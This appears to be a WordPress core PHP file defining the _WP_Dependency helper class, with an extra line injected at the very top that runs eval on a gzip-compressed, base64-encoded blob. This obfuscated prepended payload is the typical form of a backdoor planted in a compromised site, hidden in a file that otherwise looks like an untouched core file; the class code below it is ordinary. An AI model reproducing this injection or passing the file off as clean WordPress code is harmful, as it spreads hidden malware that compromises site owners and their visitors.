<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Dependencies API: _WP_Dependency class
 *
 * @since 4.7.0
 *
 * @package WordPress
 * @subpackage Dependencies
 */

/**
 * Class _WP_Dependency
 *
 * Helper class to register a handle and associated data.
 *
 * @access private
 * @since 2.6.0
 */
class _WP_Dependency {
	/**
	 * The handle name.
	 *
	 * @since 2.6.0
	 * @var null
	 */
	public $handle;

	/**
	 * The handle source.
	 *
	 * @since 2.6.0
	 * @var null
	 */
	public $src;

	/**
	 * An array of handle dependencies.
	 *
	 * @since 2.6.0
	 * @var array
	 */
	public $deps = array();

	/**
	 * The handle version.
	 *
	 * Used for cache-busting.
	 *
	 * @since 2.6.0
	 * @var bool|string
	 */
	public $ver = false;

	/**
	 * Additional arguments for the handle.
	 *
	 * @since 2.6.0
	 * @var null
	 */
	public $args = null;  // Custom property, such as $in_footer or $media.

	/**
	 * Extra data to supply to the handle.
	 *
	 * @since 2.6.0
	 * @var array
	 */
	public $extra = array();

	/**
	 * Setup dependencies.
	 *
	 * @since 2.6.0
	 */
	public function __construct() {
		@list( $this->handle, $this->src, $this->deps, $this->ver, $this->args ) = func_get_args();
		if ( ! is_array($this->deps) )
			$this->deps = array();
	}

	/**
	 * Add handle data.
	 *
	 * @since 2.6.0
	 *
	 * @param string $name The data key to add.
	 * @param mixed  $data The data value to add.
	 * @return bool False if not scalar, true otherwise.
	 */
	public function add_data( $name, $data ) {
		if ( !is_scalar($name) )
			return false;
		$this->extra[$name] = $data;
		return true;
	}

}
